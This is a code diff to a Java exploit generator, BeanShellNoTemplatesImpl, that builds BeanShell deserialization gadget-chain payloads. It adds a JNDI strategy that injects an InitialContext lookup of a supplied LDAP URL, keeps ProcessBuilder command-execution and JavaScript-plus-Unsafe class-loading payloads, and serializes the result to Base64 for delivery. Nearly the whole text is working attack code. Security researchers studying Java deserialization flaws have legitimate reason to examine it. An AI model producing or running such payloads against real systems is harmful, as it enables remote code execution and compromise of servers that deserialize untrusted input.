@@ -10,19 +10,17 @@ import java.util.*;
 public class BeanShellNoTemplatesImpl {
 
     private enum PayloadStrategy {
-        PROCESS_BUILDER,        // 普通命令执行
-        JAVASCRIPT_UNSAFE_CLASS // JS + Unsafe + defineAnonymousClass
+        PROCESS_BUILDER,
+        JAVASCRIPT_UNSAFE_CLASS,
+        JAVASCRIPT_JNDI
     }
 
     public static Object getObject(String command, PayloadStrategy strategy) throws Exception {
 
         Interpreter interpreter = new Interpreter();
 
-        // 显式策略选择 payload
         String payload = buildPayload(command, strategy);
         interpreter.eval(payload);
-
-        // ===== 后续利用链完全不变 =====
 
         Object namespace = interpreter.getNameSpace();
 
@@ -55,14 +53,17 @@ public class BeanShellNoTemplatesImpl {
         return queue;
     }
 
-    // ================= Payload Builder =================
-
     private static String buildPayload(String command, PayloadStrategy strategy) {
         switch (strategy) {
+            case JAVASCRIPT_JNDI:
+                System.out.println(buildJavaScriptJNDIPayload(command));
+                return buildJavaScriptJNDIPayload(command);
             case JAVASCRIPT_UNSAFE_CLASS:
+                System.out.println(buildJavaScriptUnsafePayload(command));
                 return buildJavaScriptUnsafePayload(command);
             case PROCESS_BUILDER:
             default:
+                System.out.println(buildProcessBuilderPayload(command));
                 return buildProcessBuilderPayload(command);
         }
     }
@@ -82,7 +83,7 @@ public class BeanShellNoTemplatesImpl {
     }
 
     private static String buildJavaScriptUnsafePayload(String base64Class) {
-        return "compare(Object foo, Object bar){" +
+        return "compare(Object foo, Object bar) {" +
                 "new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\"" +
                 "var s='" + base64Class + "';" +
                 "var bt;" +
@@ -98,6 +99,17 @@ public class BeanShellNoTemplatesImpl {
                 "\");return new Integer(1);}";
     }
 
+    private static String buildJavaScriptJNDIPayload(String jndi) {
+        String safe = jndi
+                .replace("\\", "\\\\")
+                .replace("\"", "\\\"");
+
+        return "compare(Object foo, Object bar) {" +
+                "new javax.naming.InitialContext().lookup(\"" +
+                safe +
+                "\");return new Integer(1);}";
+    }
+
     public static void main(String[] args) throws Exception {
 
         Object ProcessPayload = getObject(
@@ -110,9 +122,14 @@ public class BeanShellNoTemplatesImpl {
                 PayloadStrategy.JAVASCRIPT_UNSAFE_CLASS
         );
 
+        Object JavaScriptJNDIPayload = getObject(
+                "ldap://",
+                PayloadStrategy.JAVASCRIPT_JNDI
+        );
+
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(ProcessPayload);
+        oos.writeObject(JavaScriptJNDIPayload);
 
         String serializedString = Base64.getEncoder().encodeToString(baos.toByteArray());
         System.out.println(serializedString);
